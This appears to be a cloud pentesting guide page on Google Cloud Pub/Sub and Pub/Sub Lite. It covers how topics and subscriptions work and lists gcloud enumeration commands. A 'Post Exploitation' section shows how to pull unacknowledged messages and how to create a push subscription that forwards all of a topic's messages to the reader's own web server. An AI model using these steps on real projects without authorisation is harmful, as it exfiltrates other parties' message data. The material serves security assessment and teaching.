## Pub/Sub <a href="#reviewing-cloud-pubsub" id="reviewing-cloud-pubsub"></a>

Google [**Cloud Pub/Sub**](https://cloud.google.com/pubsub/) is a service that allows independent applications to **send messages** back and forth. Basically, there are **topics** where applications may **subscribe** to send and receive **messages** (which are composed by the message content and some metadata).

The **topic is the queue** where messages are going to be sent, while the **subscriptions** are the **objects** users are going to use to **access messages in the topics**. There can be more than **1 subscription per topic** and there are 3 types of subscriptions:

* **Pull**: The user(s) of this subscription needs to pull for messages.
* **Push**: An URL endpoint is indicated and messages will be sent immediately to it.
* **Big query table**: Like push but setting the messages inside a Big query table.

By **default**, a message is **retained for 7 days**, but this time can be **increased up to 31 days**. Also, if it's not **ACKed in 10s** it goes back to the queue.

A topic is by default encrypted using a **Google managed encryption key**. But a **CMEK** (Customer Managed Encryption Key) from KMS can also be selected.

**Dead letter**: Subscriptions may configure a **maximum number of delivery attempts**. When a message cannot be delivered, it is **republished to the specified dead letter topic**.

### Backups & Schemas

Topics might have **backups** and you could be able to find more **old sensitive information in there**. Backups maintain the **unACKed** msgs of the moment it's taken & the messages after it (and by default they live for a week).

When creating a topic, you can indicate that the **topic messages must follow a schema**.

### Enumeration

```bash
# Get a list of topics in the project
gcloud pubsub topics list
gcloud pubsub topics describe <topic>
gcloud pubsub topics list-subscriptions <topic>
gcloud pubsub topics get-iam-policy <topic>

# Get a list of subscriptions across all topics
gcloud pubsub subscriptions list
gcloud pubsub subscriptions describe <subscription>
gcloud pubsub subscriptions get-iam-policy <subscription>

# Get list of schemas
gcloud pubsub schemas list
gcloud pubsub schemas describe <snapshot>

# Get list of snapshots
gcloud pubsub snapshots list
gcloud pubsub snapshots describe <snapshot>
```

However, you may have better results [**asking for a larger set of data**](https://cloud.google.com/pubsub/docs/replay-overview), including older messages. This has some prerequisites and could impact applications, so make sure you really know what you're doing.

### Post Exploitation

{% code overflow="wrap" %}
```bash
# Publish a message in a topic
gcloud pubsub topics publish deleteme --message "Hello!"

# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>

# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint <URL to push to>
```
{% endcode %}

## Pub/Sub Lite

[**Pub/Sub Lite**](https://cloud.google.com/pubsub/docs/choosing-pubsub-or-lite) is a messaging service with **zonal storage**. Pub/Sub Lite **costs a fraction** of Pub/Sub and is meant for **high volume streaming** pipelines and event-driven system where low cost is the primary consideration.

```bash
# lite-topics
gcloud pubsub lite-topics list
gcloud pubsub lite-topics describe <topic>
gcloud pubsub lite-topics list-subscriptions <topic>

# lite-subscriptions
gcloud pubsub lite-subscriptions list
gcloud pubsub lite-subscriptions describe <subscription>

# lite-reservations
gcloud pubsub lite-reservations list
gcloud pubsub lite-reservations describe <topic>
gcloud pubsub lite-reservations list-topics <topic>

# lite-operations
gcloud pubsub lite-operations list
gcloud pubsub lite-operations describe <topic>
```
